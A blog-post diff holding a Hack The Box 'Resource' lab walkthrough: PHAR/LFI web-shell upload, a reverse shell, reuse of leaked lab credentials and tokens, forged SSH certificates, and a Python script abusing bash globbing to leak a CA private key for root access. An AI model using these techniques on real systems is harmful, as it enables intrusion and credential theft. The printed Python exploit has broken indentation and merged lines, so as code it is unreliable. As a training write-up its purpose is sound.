@@ -1,0 +1,325 @@
+---
+layout: post
+title: "Resource HTB writeup"
+subtitle: "Walkethrough for the resource HTB machine."
+date: 2024-08-22 23:45:13
+background: '/img/posts/04.jpg'
+
+---
+
+<p>Performing nmap scan using a quick verbose scan to save time.</p>
+<img src="/img/Ressource_screenshot/Pasted image 20240819182903.png" alt="Nmap scan" style="max-width: 100%; width: 600px; height: auto;">
+
+<p>Found some open ports like 22, 80, and 2222.</p>
+<p>Doing a scan in depth on those specific ports.</p>
+<img src="/img/Ressource_screenshot/Pasted image 20240819183027.png" alt="Detailed port scan" style="width: 600 px; height: auto;">
+
+<img src="/img/Ressource_screenshot/Pasted image 20240819183158.png" alt="Nmap scan" style="max-width: 100%; width: 1500px; height: auto;">
+
+<p>Visiting the page, we can see a domain being shown as 'itrc.ssg.htb'. Adding it to our /etc/hosts file.</p>
+<p>The domain may hint at multiple subdomains or Vhosts, so we perform fuzzing to discover them.</p>
+<img src="/img/Ressource_screenshot/Pasted image 20240819183930.png" alt="Page parameter">
+
+<p>Trying multiple wordlists, we find a new Vhost with the 'n0kovo_subdomains.txt' wordlist, 'signserv.ssg.htb', which we add to the hosts configuration file.</p>
+
+<p>Visiting the port 80 webpage, we are welcomed by an IT support center.</p>
+<img src="/img/Ressource_screenshot/Pasted image 20240819184948.png" alt="IT support center" style="width: 1500 px; height: auto;">
+
+<p>Following standard methodology, we check the source code but find nothing useful. We run a long gobuster scan in the background.</p>
+<img src="/img/Ressource_screenshot/Pasted image 20240819185844.png" alt="Gobuster scan" style="width: 600 px; height: auto;">
+
+<p>Registering an account on the home page and logging in with its credentials.</p>
+<img src="/img/Ressource_screenshot/Pasted image 20240819190020.png" alt="Account registration">
+
+<p>A variable page parameter pops out.</p>
+<img src="/img/Ressource_screenshot/Pasted image 20240819190117.png" alt="Page parameter">
+
+<p>LFI techniques can be tested later on.</p>
+
+
+<p>Upon logging in, we get a nice dashboard.</p>
+<img src="/img/Ressource_screenshot/Pasted image 20240819190242.png" alt="Dashboard view">
+
+<p>Creating a new ticket where we can upload zip files.</p>
+<img src="/img/Ressource_screenshot/Pasted image 20240819190345.png" alt="Upload zip files">
+
+<p>Testing with an arbitrary file.</p>
+<img src="/img/Ressource_screenshot/Pasted image 20240819190556.png" alt="Arbitrary file test">
+
+<p>Getting back to the directory scanning, we find some interesting results.</p>
+<img src="/img/Ressource_screenshot/Pasted image 20240819190509.png" alt="Directory scanning">
+
+<p>Ticket successfully created.</p>
+<img src="/img/Ressource_screenshot/Pasted image 20240819190727.png" alt="Ticket creation">
+
+<p>Inspecting the ticket.</p>
+<img src="/img/Ressource_screenshot/Pasted image 20240819190805.png" alt="Ticket inspection">
+
+<p>The zip file can be downloaded from this URL.</p>
+<img src="/img/Ressource_screenshot/Pasted image 20240819190851.png" alt="Zip file download">
+
+<p> The file name was changed to '7897482fb56032dbe80010ff567893e372e751d9.zip' which seems to be a hash. After analysis and using hash identification tools, sha1 was identified.</p>
+<p> Seems that the application hash the file in sha1 format and upload it with this name.</p>
+<img src="/img/Ressource_screenshot/Pasted image 20240819191210.png" alt="File hash verification">
+
+<p>Zip files techniques like empty zip file, zip slip, malicious code injection in the zip files, simlink and others can be tried.</p>
+<p>Uploading an empty zip files did reveal some information.</p>
+<img src="/img/Ressource_screenshot/Pasted image 20240819191616.png" alt="Empty zip file upload">
+<img src="/img/Ressource_screenshot/Pasted image 20240819191632.png" alt="Upload results">
+
+<p>First, the root directory of the webserver was exposed 'var/www/itrc/'</p>
+<p>second, we get the method ' ZipArchive' that the server use. This method has a vulnerability where it can lead to RCE , this <a href="https://snyk.io/blog/suitecrm-phar-deserialization-vulnerability-to-code-execution/" target="_blank">article</a> explains it.</p>
+<p>Rebuilding what we discovered, found the root path of the web application found a potential attack vector through a PHAR attack. What is needed for the complete attack vector to work is a vulnerable LFI parameter.</p>
+<p>We test the 'page' parameter found earlier with the findings from gobuster. 'admin.php' doesn't work, but removing the extension reveals a new page.</p>
+<img src="/img/Ressource_screenshot/Pasted image 20240819192857.png" alt="LFI discovery">
+
+<p>Testing the full path discovered: 'http://itrc.ssg.htb/?page=/var/www/itrc/admin' LFI is confirmed.</p>
+
+<p>What is needed now is to make a php web shell file, put it in a zip file, upload it and read it using the 'phar://' wrapper.</p>
+<img src="/img/Ressource_screenshot/Pasted image 20240819194232.png" alt="Zip file creation">
+<p>Last step was not necessary but it was done to get the specific name of the zip file that we will be accessing (although it could be done from the browser directly)</p>
+<p>Ticket created with the shell file.</p>
+<img src="/img/Ressource_screenshot/Pasted image 20240819193850.png" alt="Shell file ticket">
+
+<p>Accessing the shell using the 'phar://' wrapper.</p>
+<img src="/img/Ressource_screenshot/Pasted image 20240819202928.png" alt="Shell access">
+
+<p>The payload worked, now we need to catch a reverse shell by starting a listener and use a URL encoded payload from 'https://www.revshells.com/'</p>
+<img src="/img/Ressource_screenshot/Pasted image 20240819203945.png" alt="Shell access">
+
+<p>Spawning a full TTY shell and upgrading it.</p>
+<img src="/img/Ressource_screenshot/Pasted image 20240819204206.png" alt="Shell upgrade">
+
+<p>In the /var/www/itrc directory, we find a 'db.php' file containing credentials.</p>
+<img src="/img/Ressource_screenshot/Pasted image 20240819204324.png" alt="Credentials discovered">
+
+<p>Password spraying was performed on the available users but was a failure.</p>
+<p>In the /uploads directory, multiple zip files was found as we did not upload this much files.</p>
+<img src="/img/Ressource_screenshot/Pasted image 20240819204740.png" alt="zip files">
+
+<p>Extracting the uncommon file and reading the content</p>
+<img src="/img/Ressource_screenshot/Pasted image 20240819205146.png" alt="credentials in zip file">
+<p>Performing ssh to login as msainristil:82yards2closeit</p>
+<img src="/img/Ressource_screenshot/Pasted image 20240819205423.png" alt="ssh login">
+
+<p>netstat output reveals a weird IP address meaning this is another host and not the main host</p>
+<img src="/img/Ressource_screenshot/Pasted image 20240819205808.png" alt="credentials in zip file">
+
+<p>In the decommission_old_ca directory which is in the home directory of msainristil, found a certificate authority private key which is responsible in signing all the digital certificates. Reading this <a href="https://dmuth.medium.com/ssh-at-scale-cas-and-principals-b27edca3a5d" target="_blank">article</a> to understand how it works, we can try to make an SSH key pair and sign it by this CA specifying the user to whom it will be valid (here zzinter and maybe try root)</p>
+<p>First we need to make an ssh key pair</p>
+<img src="/img/Ressource_screenshot/Pasted image 20240819220157.png" alt="CA private key">
+
+<p>then we need to sign it and specify root</p>
+<img src="/img/Ressource_screenshot/Pasted image 20240819220414.png" alt="CA private key">
+<p>Now all we need to do is to shh as root by specifying the ca public key and our newly generated ssh key but first we need to chmod 600 the keys and then logging in </p>
+<img src="/img/Ressource_screenshot/Pasted image 20240819220704.png" alt="SSH as root">
+
+<p> Going through the files inside the 'zzinter' user,  a script can be found </p>
+<pre style="background-color: black; color: white;"><code>
+#!/bin/bash
+
+usage () {
+    echo "Usage: $0 <public_key_file> <username> <principal>"
+    exit 1
+}
+
+if [ "$#" -ne 3 ]; then
+    usage
+fi
+
+public_key_file="$1"
+username="$2"
+principal_str="$3"
+
+supported_principals="webserver,analytics,support,security"
+IFS=',' read -ra principal <<< "$principal_str"
+for word in "${principal[@]}"; do
+    if ! echo "$supported_principals" | grep -qw "$word"; then
+        echo "Error: '$word' is not a supported principal."
+        echo "Choose from:"
+        echo "    webserver - external web servers - webadmin user"
+        echo "    analytics - analytics team databases - analytics user"
+        echo "    support - IT support server - support user"
+        echo "    security - SOC servers - support user"
+        echo
+        usage
+    fi
+done
+
+if [ ! -f "$public_key_file" ]; then
+    echo "Error: Public key file '$public_key_file' not found."
+    usage
+fi
+
+public_key=$(cat $public_key_file)
+
+curl -s signserv.ssg.htb/v1/sign -d '{"pubkey": "'"$public_key"'", "username": "'"$username"'", "principals": "'"$principal"'"}' -H "Content-Type: application/json" -H "Authorization:Bearer 7Tqx6owMLtnt6oeR2ORbWmOPk30z4ZH901kH6UUT6vNziNqGrYgmSve5jCmnPJDE"
+</pre></code>
+
+<p>This script, with the help of external resources, can be explained as follows:</p>
+<ol>
+  <li>The script requires three arguments: <code>publicKeyFile</code>, <code>username</code>, and <code>principal</code>.</li>
+  <li>Sends a CURL request to <code>signserv.ssg.htb</code> to sign the public key.</li>
+</ol>
+<p>What we need now is to make an ssh key pair and sign it the same way we did last time but instead of doing it manually we will use the script</p>
+<img src="/img/Ressource_screenshot/Pasted image 20240819223034.png" alt="key signing pre">
+
+<p>Going for support after testing all the other principals with failure</p>
+<p>SSH to the new host </p>
+<img src="/img/Ressource_screenshot/Pasted image 20240819224247.png" alt="SSH to new host">
+
+<p>In the ssg host as support</p>
+<img src="/img/Ressource_screenshot/Pasted image 20240819224355.png" alt="new host as support">
+
+<p>Reading the '/etc/ssh/auth_principals' we see an interesting finding</p>
+<img src="/img/Ressource_screenshot/Pasted image 20240819224858.png" alt="auth principals">
+
+<p>zzinter have a principal called zzinter_temp so we can specify it while calling the script allowing us to ssh as zzinter </p>
+<p>However running the script with those parameters will give us an error because of this specific condition</p>
+<pre style="background-color: black; color: white;"><code>
+  if ! echo "$supported_principals" | grep -qw "$word"; then
+        echo "Error: '$word' is not a supported principal."
+        echo "Choose from:"
+        echo "    webserver - external web servers - webadmin user"
+        echo "    analytics - analytics team databases - analytics user"
+        echo "    support - IT support server - support user"
+        echo "    security - SOC servers - support user"
+        echo
+        usage
+    fi
+</code></pre>
+<p>We cannot call the script using the zzinter arguments so we will use the curl command</p>
+<img src="/img/Ressource_screenshot/Pasted image 20240819233918.png" alt="curl command">
+
+<p>SSH like we always do </p>
+<img src="/img/Ressource_screenshot/Pasted image 20240819234113.png" alt="zzinter user">
+
+<p>Running this command to check for sudo permissions</p>
+<img src="/img/Ressource_screenshot/Pasted image 20240819234157.png" alt="sudo -l">
+
+<p>the script is as follows</p>
+    
+<pre style="background-color: black; color: white;"><code>
+
+#!/bin/bash
+
+usage () {
+    echo "Usage: $0 <ca_file> <public_key_file> <username> <principal> <serial>"
+    exit 1
+}
+
+if [ "$#" -ne 5 ]; then
+    usage
+fi
+
+ca_file="$1"
+public_key_file="$2"
+username="$3"
+principal_str="$4"
+serial="$5"
+
+if [ ! -f "$ca_file" ]; then
+    echo "Error: CA file '$ca_file' not found."
+    usage
+fi
+
+itca=$(cat /etc/ssh/ca-it)
+ca=$(cat "$ca_file")
+if [[ $itca == $ca ]]; then
+    echo "Error: Use API for signing with this CA."
+    usage
+fi
+
+if [ ! -f "$public_key_file" ]; then
+    echo "Error: Public key file '$public_key_file' not found."
+    usage
+fi
+
+supported_principals="webserver,analytics,support,security"
+IFS=',' read -ra principal <<< "$principal_str"
+for word in "${principal[@]}"; do
+    if ! echo "$supported_principals" | grep -qw "$word"; then
+        echo "Error: '$word' is not a supported principal."
+        echo "Choose from:"
+        echo "    webserver - external web servers - webadmin user"
+        echo "    analytics - analytics team databases - analytics user"
+        echo "    support - IT support server - support user"
+        echo "    security - SOC servers - support user"
+        echo
+        usage
+    fi
+done
+
+if ! [[ $serial =~ ^[0-9]+$ ]]; then
+    echo "Error: '$serial' is not a number."
+    usage
+fi
+
+ssh-keygen -s "$ca_file" -z "$serial" -I "$username" -V -1w:forever -n "$principal" "$public_key_file"
+    
+</code></pre>
+
+<ol>
+  <li>Ensures exactly 5 arguments are provided: <code>ca_file</code>, <code>public_key_file</code>, <code>username</code>, <code>principal</code>, and <code>serial</code>.</li>
+  <li>Checks if the provided CA file matches <code>/etc/ssh/ca-it</code>. If the CA file matches, it outputs an error message and exits, instructing the user to use the API instead. It intends not to allow us to use the <code>ca-it</code> key with the script.</li>
+  <li>Uses the same principals.</li>
+  <li>Adds a serial number.</li>
+  <li>Uses <code>ssh-keygen</code> to sign the provided public key with the specified CA file, serial number, identity, validity, and principals.</li>
+</ol>
+
+<p>To exploit this script I got help from a very good friend where he explained a vulnerability in bash
+as he mentioned:  </p>
+<blockquote>
+  <p><strong>axu:</strong> As we know, BASH script tends to be vulnerable when it acts as a role of designed program. Because it is a very "soft" language that we can use various substitutions for certain codes. For example, the wildcard <code>*</code> represents a placeholder for arbitrary characters. And this script suffers from the Bash Globbing Vulnerability. It intends to stop us using the <code>cat-it</code> key, by comparing our provided CA and the original one inside <code>/etc/ssh</code> directory. Therefore, we can leak the original key by trying base64 characters (format for an RSA key) one by one adding wildcard <code>*</code> at the end, identified by the error messages.</p>
+</blockquote>
+
+<p>Using his script to help us leak the ca-it key</p>
+<pre style="background-color: black; color: white;"><code>
+ 
+import subprocess
+# SSH key elements 
+header = "-----BEGIN OPENSSH PRIVATE KEY-----" 
+footer = "-----END OPENSSH PRIVATE KEY-----" 
+ba64chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=" key = [] 
+line= 0 
+# Iterates over each character to test if it's the next correct one 
+while True: 
+	for char in ba64chars: 
+	# Constructs a test key with * 
+	testKey = f"{header}\n{''.join(key)}{char}*" 
+	with open("ca-test", "w") as f: 
+		f.write(testKey) 
+	proc = subprocess.run( 
+	["sudo", "/opt/sign_key.sh", "ca-test", "xpl.pub", "root", "root_user", "1"],
+	capture_output=True 
+	) 
+	# If matched, Error code 1 
+	if proc.returncode == 1: 
+	key.append(char) 
+	# Adds a newline every 70 characters 
+		if len(key) > 1 and (len(key) - line) % 70 == 0: 
+			key.append("\n") 
+			line += 1 
+		break 
+	else: 
+		break 
+# Constructs the final SSH key from the discovered characters 
+caKey = f"{header}\n{''.join(key)}\n{footer}" 
+print("The final leaked ca-it is: ", caKey) 
+with open("ca-it", "w") as f: 
+	f.write(caKey)
+
+</code></pre>
+
+<p>So before running this amazing script, we need to make a ssh key pair</p>
+<p>After running the script, we get the valid 'ca-it 'file leaked</p>
+<img src="/img/Ressource_screenshot/Pasted image 20240820003141.png" alt="cat it leaked">
+	
+<p>Now signing a new key pair with the freshly leaked certificate</p>
+<pre style="background-color: black; color: white;"><code>
+ssh-keygen -s ca-it -z 1234 -I root -V -100w:forever -n root_user rootKey.pub
+</code></pre>
+<p>And finally we can ssh to root with the following command</p>
+<pre style="background-color: black; color: white;"><code>
+ssh -o CertificateFile=rootKey-cert.pub -i rootKey root@localhost -p 2222
+</code></pre>
